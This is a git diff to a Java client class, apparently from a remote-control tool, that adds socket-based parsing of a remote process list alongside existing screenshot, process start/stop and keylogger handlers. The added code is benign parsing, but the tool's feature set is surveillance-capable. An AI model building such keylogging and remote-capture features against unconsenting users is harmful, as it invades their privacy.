@@ -57,14 +57,19 @@ public class Client
             case "ScreenShot":
                 handleScreenShot(action);
                 break;
-            case "StartProcess":
-            case "StopProcess":
             case "ListProcess":
+                handleListProcess(action);
+            case "StopProcess":
+            case "StartProcess":
                 break;
         }
     }
 
     private void notifyController(String action, String out) {
+        this.controller.handleReturnedValue(action, out);
+    }
+
+    private void notifyController(String action, ArrayList<ArrayList<String>> out) {
         this.controller.handleReturnedValue(action, out);
     }
 
@@ -104,6 +109,36 @@ public class Client
         }
 
         return image;
+    }
+
+    private void handleListProcess(String action)
+    {
+        ArrayList<ArrayList<String>> result = new ArrayList<>();
+        try {
+            sock.setSoTimeout(400);
+            byte[] buffer = new byte[1024];
+            inputStream.read(buffer);
+            String infoLine;
+            while (true) {
+                inputStream.read(buffer);
+                infoLine = new String(buffer, StandardCharsets.UTF_8);
+                infoLine = infoLine.trim();
+
+                ArrayList<String> tempArray = new ArrayList<String>();
+                tempArray.add("  " + infoLine.substring(0, 28).trim());
+                tempArray.add("  " + infoLine.substring(28, 34).trim());
+                tempArray.add("  " + infoLine.substring(34, 50).trim());
+                tempArray.add("  " + infoLine.substring(68, 76).trim());
+
+                System.out.println(infoLine);
+
+                result.add(tempArray);
+            }
+        }
+        catch (IOException ioE)
+        {
+            notifyController(action, result);
+        }
     }
 
     private void handleKeyLogger(String command)
